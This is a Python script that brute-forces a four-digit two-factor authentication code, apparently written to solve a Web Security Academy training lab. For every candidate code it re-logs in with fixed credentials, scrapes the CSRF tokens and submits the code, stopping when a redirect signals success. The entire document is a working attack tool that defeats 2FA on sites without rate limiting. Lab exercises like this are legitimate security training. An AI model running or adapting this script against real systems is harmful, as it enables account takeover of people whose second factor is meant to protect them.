import requests
import re

LAB_URL = "https://0adf00d20387a027b7c97e7500480014.web-security-academy.net/"
USERNAME = "carlos"
PASSWORD = "montoya"

def get_csrf_token(response_text):
    match = re.search(r'name="csrf" value="(.*?)"', response_text)
    if match:
        return match.group(1)
    return None

def solve_2fa():
    print(f"[+] Target: {LAB_URL}")
    
    for i in range(10000):
        code = f"{i:04d}"
        session = requests.Session()
        
        try:
            resp = session.get(f"{LAB_URL}/login")
            csrf_login = get_csrf_token(resp.text)
            
            if not csrf_login:
                break

            login_data = {
                'username': USERNAME,
                'password': PASSWORD,
                'csrf': csrf_login
            }
            resp = session.post(f"{LAB_URL}/login", data=login_data)
            
            csrf_2fa = get_csrf_token(resp.text)
            
            if not csrf_2fa:
                continue

            mfa_data = {
                'mfa-code': code,
                'csrf': csrf_2fa
            }
            
            resp_final = session.post(f"{LAB_URL}/login2", data=mfa_data, allow_redirects=False)
            
            if i % 50 == 0:
                print(f"[*] Trying: {code}...", end="\r")

            if resp_final.status_code == 302:
                print(f"\n[+] FOUND: {code}")
                session.get(f"{LAB_URL}/my-account")
                break
                
        except Exception:
            break

if __name__ == "__main__":
    solve_2fa()